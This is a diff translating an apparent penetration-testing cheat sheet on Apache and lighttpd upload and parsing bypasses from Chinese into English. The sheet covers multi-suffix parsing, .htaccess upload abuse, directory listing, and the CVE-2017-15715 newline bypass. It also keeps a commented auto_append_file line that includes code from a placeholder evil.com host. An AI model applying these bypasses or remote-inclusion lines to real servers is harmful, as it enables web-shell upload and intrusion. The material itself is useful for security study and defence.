@@ -1,13 +1,13 @@
 Apache
 ========================================
 
-后缀解析
+Suffix analysis
 ----------------------------------------
-``test.php.x1.x2.x3`` （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析
+``test.php.x1.x2.x3`` (x1,x2,x3 are file types not defined in the mime.types file). Apache will judge the suffix from right to left. If x3 is a non-recognizable suffix, it will judge x2 until a recognized suffix is ​​found, and then parse the recognized suffix.
 
 .htaccess
 ----------------------------------------
-当AllowOverride被启用时，上传启用解析规则的.htaccess
+When AllowOverride is enabled, upload .htaccess with parsing rules enabled
 
 ::
 
@@ -36,18 +36,18 @@ Apache
     #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
     #php_value auto_append_file https://evil.com/evil-code.txt
 
-目录遍历
+directory traversal
 ----------------------------------------
-配置 ``Options +Indexes`` 时Apache存在目录遍历漏洞。
+There is a directory traversal vulnerability in Apache when configuring ``Options +Indexes``.
 
 CVE-2017-15715
 ----------------------------------------
-``%0A`` 绕过上传黑名单。
+``%0A`` Bypass upload blacklist.
 
 lighttpd
 ----------------------------------------
 ``xx.jpg/xx.php``
 
-参考链接
+Reference link
 ----------------------------------------
-- `Apache 上传绕过 <https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html>`_
+- `Apache upload bypass <https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html>`_
